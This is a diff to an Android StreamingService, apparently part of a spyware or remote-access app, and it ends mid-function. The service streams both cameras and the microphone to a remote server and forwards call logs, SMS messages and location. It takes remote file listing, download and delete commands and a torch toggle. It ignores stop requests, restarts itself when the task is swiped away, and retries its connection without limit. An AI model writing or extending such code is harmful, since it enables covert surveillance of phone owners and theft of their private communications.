@@ -7,9 +7,12 @@ import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -69,7 +72,10 @@ public class StreamingService extends Service {
     private static final String CHANNEL_ID = "streaming_channel";
     private static final int NOTIFICATION_ID = 1;
     public static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
-    private static final long DATA_POLL_INTERVAL = 30_000; // 30s
+    private static final long DATA_POLL_INTERVAL = 30_000;
+
+    // ── max bitrate cap (kbps) to keep video stable on slow networks ──
+    private static final int MAX_VIDEO_BITRATE_KBPS = 800;
 
     private PeerConnectionFactory factory;
     private EglBase eglBase;
@@ -88,25 +94,40 @@ public class StreamingService extends Service {
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
 
+    // torch
+    private CameraManager cameraManager;
+    private String torchCameraId = null;
+    private boolean torchOn = false;
+
+    // reconnect guard
+    private boolean isReconnecting = false;
+    private final Handler reconnectHandler = new Handler(Looper.getMainLooper());
+
     @Override
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "Service onCreate");
-
-        // Foreground within 5s on O+; on Android 13+ you must have POST_NOTIFICATIONS granted
         startForeground(NOTIFICATION_ID, createNotification());
 
         if (!hasEssentialPermissions()) {
-            Log.e(TAG, "Missing essential permissions (camera/mic/notifications). Stopping.");
+            Log.e(TAG, "Missing essential permissions. Stopping.");
             stopSelf();
             return;
+        }
+
+        // Init torch
+        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        try {
+            String[] ids = cameraManager.getCameraIdList();
+            if (ids.length > 0) torchCameraId = ids[0];
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Cannot get camera list for torch", e);
         }
 
         initializeWebRTC();
         setupMediaStreaming();
         connectSignaling();
-
-        startDataPollingIfAllowed();   // guarded by SMS/CALL permissions
+        startDataPollingIfAllowed();
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
     }
 
@@ -115,19 +136,15 @@ public class StreamingService extends Service {
         if (intent != null) {
             String action = intent.getAction();
             if ("STOP_STREAMING".equals(action)) {
-                // stopSelf(); // DISABLED for auto-stream persistence
                 Log.i(TAG, "Stop request ignored for persistent mode");
+            } else if ("ACTION_SYNC_DATA".equals(action)) {
+                Log.d(TAG, "Forced data sync requested");
+                if (webClientId != null) {
+                    sendCallLogs();
+                    sendSmsMessages();
+                }
             }
         }
-
-        if (intent != null && "ACTION_SYNC_DATA".equals(intent.getAction())) {
-            Log.d(TAG, "Forced data sync requested");
-            if (webClientId != null) {
-                sendCallLogs();
-                sendSmsMessages();
-            }
-        }
-        // Ask system to recreate after kill (keeps running when app is swiped away/locked)
         return START_STICKY;
     }
 
@@ -140,58 +157,40 @@ public class StreamingService extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    private String getSignalingUrl() {
-        return SettingsRepository.getSignalingUrl(this);
-    }
-
-    /**
-     * ONLY the permissions that are absolutely required for streaming:
-     * - CAMERA
-     * - RECORD_AUDIO
-     * - (Android 13+) POST_NOTIFICATIONS (so the foreground notif can show)
-     *
-     * Call Log / SMS / Location are OPTIONAL and checked where used.
-     */
-    private boolean hasEssentialPermissions() {
-        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                == PackageManager.PERMISSION_GRANTED;
-        boolean audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
-                == PackageManager.PERMISSION_GRANTED;
-        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                        == PackageManager.PERMISSION_GRANTED;
-
-        if (!camera) Log.e(TAG, "Camera permission missing");
-        if (!audio)  Log.e(TAG, "Record audio permission missing");
-        if (!notify) Log.e(TAG, "Notifications permission missing (Android 13+)");
-        return camera && audio && notify;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        Log.d(TAG, "onTaskRemoved: scheduling self-restart if permitted");
-
-        // If the essentials aren't granted, don't try to resurrect.
-        if (!hasEssentialPermissions()) {
-            super.onTaskRemoved(rootIntent);
-            return;
-        }
-
-        // Relaunch the FGS promptly.
+        Log.d(TAG, "onTaskRemoved: scheduling self-restart");
+        if (!hasEssentialPermissions()) { super.onTaskRemoved(rootIntent); return; }
         Intent restart = new Intent(getApplicationContext(), StreamingService.class);
         restart.setPackage(getPackageName());
         try {
-            androidx.core.content.ContextCompat.startForegroundService(getApplicationContext(), restart);
+            ContextCompat.startForegroundService(getApplicationContext(), restart);
         } catch (IllegalStateException e) {
             Log.w(TAG, "FGS start not allowed in onTaskRemoved", e);
         }
         super.onTaskRemoved(rootIntent);
     }
 
+    private String getSignalingUrl() {
+        return SettingsRepository.getSignalingUrl(this);
+    }
+
+    private boolean hasEssentialPermissions() {
+        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
+        boolean audio  = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
+        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
+        if (!camera) Log.e(TAG, "Camera permission missing");
+        if (!audio)  Log.e(TAG, "Record audio permission missing");
+        if (!notify) Log.e(TAG, "Notifications permission missing");
+        return camera && audio && notify;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // WebRTC init
+    // ─────────────────────────────────────────────────────────────────────────
     private void initializeWebRTC() {
         PeerConnectionFactory.initialize(
                 PeerConnectionFactory.InitializationOptions.builder(this)
@@ -215,98 +214,73 @@ public class StreamingService extends Service {
         Camera2Enumerator enumerator = new Camera2Enumerator(this);
         String frontDevice = null;
         for (String name : enumerator.getDeviceNames()) {
-            if (enumerator.isFrontFacing(name)) {
-                frontDevice = name;
-                break;
-            }
+            if (enumerator.isFrontFacing(name)) { frontDevice = name; break; }
         }
-        if (frontDevice == null) {
-            Log.e(TAG, "No front camera available");
-            return;
-        }
+        if (frontDevice == null) { Log.e(TAG, "No front camera"); return; }
         frontCapturer = enumerator.createCapturer(frontDevice, null);
-        frontHelper = SurfaceTextureHelper.create("FrontCaptureThread", eglBase.getEglBaseContext());
-        frontSource = factory.createVideoSource(false);
+        frontHelper   = SurfaceTextureHelper.create("FrontCaptureThread", eglBase.getEglBaseContext());
+        frontSource   = factory.createVideoSource(false);
         frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
-        try {
-            frontCapturer.startCapture(640, 480, 30);
-            Log.d(TAG, "Front video capture started");
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to start front video capture", e);
-        }
+        try { frontCapturer.startCapture(640, 480, 25); Log.d(TAG, "Front capture started"); }
+        catch (Exception e) { Log.e(TAG, "Front capture start failed", e); }
     }
 
     private void setupBackCapture() {
         Camera2Enumerator enumerator = new Camera2Enumerator(this);
         String backDevice = null;
         for (String name : enumerator.getDeviceNames()) {
-            if (enumerator.isBackFacing(name)) {
-                backDevice = name;
-                break;
-            }
+            if (enumerator.isBackFacing(name)) { backDevice = name; break; }
         }
-        if (backDevice == null) {
-            Log.w(TAG, "No back camera available");
-            return;
-        }
+        if (backDevice == null) { Log.w(TAG, "No back camera"); return; }
         backCapturer = enumerator.createCapturer(backDevice, null);
-        backHelper = SurfaceTextureHelper.create("BackCaptureThread", eglBase.getEglBaseContext());
-        backSource = factory.createVideoSource(false);
+        backHelper   = SurfaceTextureHelper.create("BackCaptureThread", eglBase.getEglBaseContext());
+        backSource   = factory.createVideoSource(false);
         backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
-        try {
-            backCapturer.startCapture(640, 480, 30);
-            Log.d(TAG, "Back video capture started");
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to start back video capture", e);
-        }
+        try { backCapturer.startCapture(640, 480, 25); Log.d(TAG, "Back capture started"); }
+        catch (Exception e) { Log.e(TAG, "Back capture start failed", e); }
     }
 
     private void setupAudioCapture() {
-        MediaConstraints audioConstraints = new MediaConstraints();
-        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
-        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
-        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
-        audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
-        audioSource = factory.createAudioSource(audioConstraints);
+        MediaConstraints ac = new MediaConstraints();
+        ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
+        ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
+        ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
+        ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
+        audioSource = factory.createAudioSource(ac);
         Log.d(TAG, "Audio capture initialized");
     }
 
-    // ── Updated setupPeerConnection() ──────────────────────────────────────────
     private void setupPeerConnection() {
         List<PeerConnection.IceServer> ice = new ArrayList<>();
 
-        // Google STUN
+        // Primary STUN
+        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
+        ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
+        ice.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());
+
+        // Reliable free TURN (freestun.net)
         ice.add(PeerConnection.IceServer
-                .builder("stun:stun.l.google.com:19302")
+                .builder("turn:freestun.net:3478")
+                .setUsername("free")
+                .setPassword("free")
+                .createIceServer());
+        ice.add(PeerConnection.IceServer
+                .builder("turns:freestun.net:5349")
+                .setUsername("free")
+                .setPassword("free")
                 .createIceServer());
 
-        // Metered STUN
-        ice.add(PeerConnection.IceServer
-                .builder("stun:stun.relay.metered.ca:80")
-                .createIceServer());
-
-        // TURN UDP port 80
+        // Metered TURN (backup)
         ice.add(PeerConnection.IceServer
                 .builder("turn:global.relay.metered.ca:80")
                 .setUsername("openrelayproject")
                 .setPassword("openrelayproject")
                 .createIceServer());
-
-        // TURN TCP port 80
-        ice.add(PeerConnection.IceServer
-                .builder("turn:global.relay.metered.ca:80?transport=tcp")
-                .setUsername("openrelayproject")
-                .setPassword("openrelayproject")
-                .createIceServer());
-
-        // TURN UDP port 443
         ice.add(PeerConnection.IceServer
                 .builder("turn:global.relay.metered.ca:443")
                 .setUsername("openrelayproject")
                 .setPassword("openrelayproject")
                 .createIceServer());
-
-        // TURN TLS / TCP port 443
         ice.add(PeerConnection.IceServer
                 .builder("turns:global.relay.metered.ca:443?transport=tcp")
                 .setUsername("openrelayproject")
@@ -314,20 +288,45 @@ public class StreamingService extends Service {
                 .createIceServer());
 
         PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
-        config.sdpSemantics           = PeerConnection.SdpSemantics.UNIFIED_PLAN;
-        config.continualGatheringPolicy =
-                PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
-        config.tcpCandidatePolicy     = PeerConnection.TcpCandidatePolicy.DISABLED;
-        config.bundlePolicy           = PeerConnection.BundlePolicy.MAXBUNDLE;
-        config.rtcpMuxPolicy          = PeerConnection.RtcpMuxPolicy.REQUIRE;
+        config.sdpSemantics              = PeerConnection.SdpSemantics.UNIFIED_PLAN;
+        config.continualGatheringPolicy  = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
+        config.tcpCandidatePolicy        = PeerConnection.TcpCandidatePolicy.ENABLED;
+        config.bundlePolicy              = PeerConnection.BundlePolicy.MAXBUNDLE;
+        config.rtcpMuxPolicy             = PeerConnection.RtcpMuxPolicy.REQUIRE;
+        // Keep ICE alive aggressively
+        config.iceConnectionReceivingTimeout = 5000;
+        config.iceBackupCandidatePairPingInterval = 2000;
 
         peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
             @Override public void onSignalingChange(PeerConnection.SignalingState s)         { Log.d(TAG, "Signaling: " + s); }
-            @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) { Log.d(TAG, "ICE: " + s); }
             @Override public void onIceConnectionReceivingChange(boolean r)                  {}
             @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s)   { Log.d(TAG, "ICE gathering: " + s); }
-            @Override public void onIceCandidate(IceCandidate c) {
-                if (webClientId == null || socket == null) return;
+            @Override public void onIceCandidatesRemoved(IceCandidate[] cs)                  {}
+            @Override public void onAddStream(org.webrtc.MediaStream ms)                     {}
+            @Override public void onRemoveStream(org.webrtc.MediaStream ms)                  {}
+            @Override public void onDataChannel(org.webrtc.DataChannel dc)                   {}
+            @Override public void onRenegotiationNeeded()                                    { Log.d(TAG, "Renegotiation needed"); }
+            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms)     { Log.d(TAG, "Track added: " + r.id()); }
+
+            @Override
+            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
+                Log.d(TAG, "ICE state: " + s);
+                if (s == PeerConnection.IceConnectionState.FAILED
+                        || s == PeerConnection.IceConnectionState.DISCONNECTED) {
+                    Log.w(TAG, "ICE " + s + " — restarting ICE");
+                    // Try ICE restart first (lightweight)
+                    if (peerConnection != null && webClientId != null) {
+                        new Handler(Looper.getMainLooper()).post(() -> restartIce());
+                    }
+                } else if (s == PeerConnection.IceConnectionState.CLOSED) {
+                    Log.w(TAG, "ICE CLOSED — full reconnect");
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> fullReconnect(), 2000);
+                }
+            }
+
+            @Override
+            public void onIceCandidate(IceCandidate c) {
+                if (webClientId == null || socket == null || !socket.connected()) return;
                 try {
                     JSONObject candidate = new JSONObject();
                     candidate.put("sdpMid",        c.sdpMid);
@@ -345,51 +344,94 @@ public class StreamingService extends Service {
                     Log.e(TAG, "ICE send failed", e);
                 }
             }
-            @Override public void onIceCandidatesRemoved(IceCandidate[] cs)                  {}
-            @Override public void onAddStream(org.webrtc.MediaStream ms)                     {}
-            @Override public void onRemoveStream(org.webrtc.MediaStream ms)                  {}
-            @Override public void onDataChannel(org.webrtc.DataChannel dc)                   {}
-            @Override public void onRenegotiationNeeded()                                    {}
-            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms)     { Log.d(TAG, "Track added: " + r.id()); }
         });
 
-        if (peerConnection == null) {
-            Log.e(TAG, "Failed to create PeerConnection");
-            return;
-        }
+        if (peerConnection == null) { Log.e(TAG, "Failed to create PeerConnection"); return; }
 
         if (frontSource != null) {
             VideoTrack frontTrack = factory.createVideoTrack("front_camera", frontSource);
             peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                     Collections.singletonList("stream")));
-            Log.d(TAG, "Front video track added");
         }
         if (backSource != null) {
             VideoTrack backTrack = factory.createVideoTrack("back_camera", backSource);
             peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                     Collections.singletonList("stream")));
-            Log.d(TAG, "Back video track added");
         }
         if (audioSource != null) {
             AudioTrack at = factory.createAudioTrack("audio", audioSource);
             peerConnection.addTransceiver(at, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                     Collections.singletonList("stream")));
-            Log.d(TAG, "Audio track added");
         }
+        Log.d(TAG, "PeerConnection created with " + ice.size() + " ICE servers");
     }
-    // ── End of updated setupPeerConnection() ───────────────────────────────────
 
+    // ── ICE restart (keeps existing connection, asks for new ICE candidates) ─
+    private void restartIce() {
+        if (peerConnection == null || webClientId == null) return;
+        Log.d(TAG, "Performing ICE restart");
+        MediaConstraints mc = new MediaConstraints();
+        mc.mandatory.add(new MediaConstraints.KeyValuePair("IceRestart", "true"));
+        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
+        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
+        peerConnection.createOffer(new SdpObserver() {
+            @Override public void onCreateSuccess(SessionDescription sdp) {
+                String modified = applyBitrateConstraints(sdp.description);
+                SessionDescription modSdp = new SessionDescription(sdp.type, modified);
+                peerConnection.setLocalDescription(new SdpObserver() {
+                    @Override public void onSetSuccess() {
+                        try {
+                            JSONObject signal = new JSONObject();
+                            signal.put("type", "offer");
+                            signal.put("sdp", modSdp.description);
+                            JSONObject msg = new JSONObject();
+                            msg.put("to", webClientId);
+                            msg.put("from", socket.id());
+                            msg.put("signal", signal);
+                            socket.emit("signal", msg);
+                            Log.d(TAG, "ICE restart offer sent");
+                        } catch (JSONException e) { Log.e(TAG, "ICE restart offer send fail", e); }
+                    }
+                    @Override public void onSetFailure(String e)      { Log.e(TAG, "ICE restart setLocal fail: " + e); }
+                    @Override public void onCreateSuccess(SessionDescription s) {}
+                    @Override public void onCreateFailure(String f)   {}
+                }, modSdp);
+            }
+            @Override public void onSetSuccess()           {}
+            @Override public void onCreateFailure(String e){ Log.e(TAG, "ICE restart createOffer fail: " + e); }
+            @Override public void onSetFailure(String e)   {}
+        }, mc);
+    }
+
+    // ── Full reconnect: tear down PeerConnection and rebuild ─────────────────
+    private void fullReconnect() {
+        if (isReconnecting) return;
+        isReconnecting = true;
+        Log.d(TAG, "Full PeerConnection reconnect");
+        if (peerConnection != null) {
+            peerConnection.close();
+            peerConnection = null;
+        }
+        setupPeerConnection();
+        if (webClientId != null) createAndSendOffer();
+        isReconnecting = false;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // Signaling
+    // ─────────────────────────────────────────────────────────────────────────
     private void connectSignaling() {
         String signalingUrl = getSignalingUrl();
         Log.d(TAG, "Connecting to signaling at " + signalingUrl);
         IO.Options opts = new IO.Options();
         opts.transports           = new String[]{"websocket"};
         opts.reconnection         = true;
-        opts.reconnectionAttempts = 5;
-        opts.reconnectionDelay    = 5000;
+        opts.reconnectionAttempts = Integer.MAX_VALUE;   // unlimited
+        opts.reconnectionDelay    = 3000;
+        opts.reconnectionDelayMax = 10000;
 
         try {
             socket = IO.socket(signalingUrl, opts);
@@ -402,7 +444,11 @@ public class StreamingService extends Service {
         socket.on(Socket.EVENT_CONNECT, args -> {
             Log.d(TAG, "Socket.IO CONNECTED");
             socket.emit("identify", "android");
-            createAndSendOffer();
+            // Re-offer if we already had a web client (after reconnect)
+            if (webClientId != null) createAndSendOffer();
+        }).on(Socket.EVENT_DISCONNECT, args -> {
+            Log.w(TAG, "Socket.IO DISCONNECTED: " + Arrays.toString(args));
+            // Socket.io will auto-reconnect due to opts; nothing to do here
         }).on(Socket.EVENT_CONNECT_ERROR, args -> {
             Log.e(TAG, "Connect error: " + Arrays.toString(args));
         }).on("id", args -> {
@@ -411,6 +457,8 @@ public class StreamingService extends Service {
             if (args.length > 0 && args[0] instanceof String) {
                 webClientId = (String) args[0];
                 Log.d(TAG, "Web client ready: " + webClientId);
+                // Ensure PeerConnection is alive
+                if (peerConnection == null) setupPeerConnection();
                 createAndSendOffer();
                 startLocationUpdatesIfAllowed();
                 sendCallLogs();
@@ -428,244 +476,76 @@ public class StreamingService extends Service {
                     stopLocationUpdates();
                 }
             }
+        }).on("torch", args -> {
+            // Toggle flash: payload: { "on": true/false }
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                try {
+                    boolean on = ((JSONObject) args[0]).optBoolean("on", false);
+                    setTorch(on);
+                } catch (Exception e) { Log.e(TAG, "torch event error", e); }
+            }
         }).on("fs:list", args -> {
-            if (args.length > 0 && args[0] instanceof JSONObject) {
-                handleFsList((JSONObject) args[0]);
-            }
+            if (args.length > 0 && args[0] instanceof JSONObject) handleFsList((JSONObject) args[0]);
         }).on("fs:download", args -> {
-            if (args.length > 0 && args[0] instanceof JSONObject) {
-                handleFsDownload((JSONObject) args[0]);
-            }
+            if (args.length > 0 && args[0] instanceof JSONObject) handleFsDownload((JSONObject) args[0]);
         }).on("fs:delete", args -> {
-            if (args.length > 0 && args[0] instanceof JSONObject) {
-                handleFsDelete((JSONObject) args[0]);
-            }
+            if (args.length > 0 && args[0] instanceof JSONObject) handleFsDelete((JSONObject) args[0]);
         });
 
         socket.connect();
     }
 
-    /** Optional: only if FINE_LOCATION granted */
-    private void startLocationUpdatesIfAllowed() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                != PackageManager.PERMISSION_GRANTED) {
-            Log.i(TAG, "Location permission not granted; skipping location updates");
+    // ─────────────────────────────────────────────────────────────────────────
+    // Torch / Flash
+    // ─────────────────────────────────────────────────────────────────────────
+    private void setTorch(boolean enable) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+            Log.w(TAG, "Torch API requires API 23+");
             return;
         }
-
-        LocationRequest locationRequest = LocationRequest.create();
-        locationRequest.setInterval(10_000);
-        locationRequest.setFastestInterval(5_000);
-        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
-
-        locationCallback = new LocationCallback() {
-            @Override
-            public void onLocationResult(LocationResult locationResult) {
-                if (locationResult == null) return;
-                for (android.location.Location location : locationResult.getLocations()) {
-                    sendLocation(location.getLatitude(), location.getLongitude());
-                }
-            }
-        };
-
-        try {
-            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
-            Log.d(TAG, "Started location updates");
-        } catch (SecurityException e) {
-            Log.e(TAG, "Failed to start location updates", e);
-        }
-    }
-
-    private void sendLocation(double latitude, double longitude) {
-        if (webClientId == null || socket == null || !socket.connected()) {
-            Log.w(TAG, "Cannot send location, no web client or socket disconnected");
+        if (torchCameraId == null) {
+            Log.w(TAG, "No torch camera ID available");
             return;
         }
         try {
-            JSONObject locationData = new JSONObject();
-            locationData.put("from",      socket.id());
-            locationData.put("to",        webClientId);
-            locationData.put("latitude",  latitude);
-            locationData.put("longitude", longitude);
-            socket.emit("location", locationData);
-            Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending location", e);
+            cameraManager.setTorchMode(torchCameraId, enable);
+            torchOn = enable;
+            Log.d(TAG, "Torch set to: " + enable);
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Failed to toggle torch", e);
         }
     }
 
-    private void stopLocationUpdates() {
-        if (locationCallback != null && fusedLocationClient != null) {
-            fusedLocationClient.removeLocationUpdates(locationCallback);
-            locationCallback = null;
-            Log.d(TAG, "Stopped location updates");
-        }
-    }
-
-    @SuppressWarnings("unused")
-    private void startNotificationListener() {
-        Log.i(TAG, "NotificationListener must be enabled by the user in system settings; not starting directly.");
-    }
-
-    /** Optional: only if READ_CALL_LOG + READ_SMS granted */
-    private void startDataPollingIfAllowed() {
-        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
-                == PackageManager.PERMISSION_GRANTED;
-        boolean canSms  = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-                == PackageManager.PERMISSION_GRANTED;
-
-        if (!canCall || !canSms) {
-            Log.i(TAG, "Call log or SMS permission not granted; skipping data polling");
-            return;
-        }
-
-        dataHandler  = new Handler(Looper.getMainLooper());
-        dataRunnable = new Runnable() {
-            @Override public void run() {
-                sendCallLogs();
-                sendSmsMessages();
-                if (dataHandler != null) {
-                    dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
-                }
+    // ─────────────────────────────────────────────────────────────────────────
+    // Offer creation with bitrate constraints
+    // ─────────────────────────────────────────────────────────────────────────
+    private String applyBitrateConstraints(String sdp) {
+        // Cap video bitrate to MAX_VIDEO_BITRATE_KBPS for stable streaming
+        StringBuilder sb = new StringBuilder();
+        boolean inVideoSection = false;
+        for (String line : sdp.split("\r?\n")) {
+            sb.append(line).append("\r\n");
+            if (line.startsWith("m=video")) {
+                inVideoSection = true;
+            } else if (line.startsWith("m=")) {
+                inVideoSection = false;
             }
-        };
-        dataHandler.post(dataRunnable);
-    }
-
-    private void sendCallLogs() {
-        if (webClientId == null || socket == null || !socket.connected()) {
-            Log.w(TAG, "Cannot send call logs, no web client or socket disconnected");
-            return;
-        }
-        try {
-            ContentResolver resolver = getContentResolver();
-            String[] projection = {
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-            };
-            Cursor cursor = resolver.query(
-                    CallLog.Calls.CONTENT_URI,
-                    projection, null, null,
-                    CallLog.Calls.DATE + " DESC");
-            if (cursor == null) {
-                Log.e(TAG, "Failed to query call logs");
-                return;
+            if (inVideoSection && line.startsWith("c=")) {
+                sb.append("b=AS:").append(MAX_VIDEO_BITRATE_KBPS).append("\r\n");
             }
-
-            JSONArray callLogs = new JSONArray();
-            int count = 0;
-            while (cursor.moveToNext() && count < 10) {
-                JSONObject call   = new JSONObject();
-                String number     = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                int    type       = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                long   date       = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
-                long   duration   = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-
-                call.put("number",   number != null ? number : "Unknown");
-                call.put("type",     getCallTypeString(type));
-                call.put("date",     new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
-                call.put("duration", duration);
-                callLogs.put(call);
-                count++;
-            }
-            cursor.close();
-
-            JSONObject msg = new JSONObject();
-            msg.put("to",        webClientId);
-            msg.put("from",      socket.id());
-            msg.put("call_logs", callLogs);
-            socket.emit("call_log", msg);
-            Log.d(TAG, "Sent call logs: " + callLogs);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending call logs", e);
-        } catch (Exception e) {
-            Log.e(TAG, "Error querying call logs", e);
         }
-    }
-
-    private void sendSmsMessages() {
-        if (webClientId == null || socket == null || !socket.connected()) {
-            Log.w(TAG, "Cannot send SMS messages, no web client or socket disconnected");
-            return;
-        }
-        try {
-            ContentResolver resolver = getContentResolver();
-            String[] projection = {
-                    Telephony.Sms.ADDRESS,
-                    Telephony.Sms.BODY,
-                    Telephony.Sms.DATE,
-                    Telephony.Sms.TYPE
-            };
-            Cursor cursor = resolver.query(
-                    Telephony.Sms.CONTENT_URI,
-                    projection, null, null,
-                    Telephony.Sms.DATE + " DESC");
-            if (cursor == null) {
-                Log.e(TAG, "Failed to query SMS messages");
-                return;
-            }
-
-            JSONArray smsMessages = new JSONArray();
-            int count = 0;
-            while (cursor.moveToNext() && count < 50) {
-                JSONObject sms  = new JSONObject();
-                String address  = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                String body     = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                long   date     = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                int    type     = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
-
-                sms.put("address", address != null ? address : "Unknown");
-                sms.put("body",    body != null    ? body    : "");
-                sms.put("date",    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
-                sms.put("type",    getSmsTypeString(type));
-                smsMessages.put(sms);
-                count++;
-            }
-            cursor.close();
-
-            JSONObject msg = new JSONObject();
-            msg.put("to",           webClientId);
-            msg.put("from",         socket.id());
-            msg.put("sms_messages", smsMessages);
-            socket.emit("sms", msg);
-            Log.d(TAG, "Sent SMS messages: " + smsMessages);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending SMS messages", e);
-        } catch (Exception e) {
-            Log.e(TAG, "Error querying SMS messages", e);
-        }
-    }
-
-    private String getCallTypeString(int type) {
-        switch (type) {
-            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
-            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
-            case CallLog.Calls.MISSED_TYPE:   return "Missed";
-            default:                          return "Unknown";
-        }
-    }
-
-    private String getSmsTypeString(int type) {
-        switch (type) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
-            default:                               return "Unknown";
-        }
+        // Also ensure sendonly direction
+        String result = sb.toString()
+                .replace("a=sendrecv", "a=sendonly")
+                .replace("a=recvonly", "a=sendonly");
+        return result;
     }
 
     private void createAndSendOffer() {
-        if (peerConnection == null) {
-            Log.e(TAG, "PeerConnection not ready");
-            return;
-        }
-        if (webClientId == null) {
-            Log.w(TAG, "No web client available yet; will send when ready");
-            return;
-        }
+        if (peerConnection == null) { Log.e(TAG, "PeerConnection not ready"); return; }
+        if (webClientId == null)    { Log.w(TAG, "No web client yet"); return; }
 
-        Log.d(TAG, "Creating offer for web client: " + webClientId);
+        Log.d(TAG, "Creating offer for: " + webClientId);
         MediaConstraints mc = new MediaConstraints();
         mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
         mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
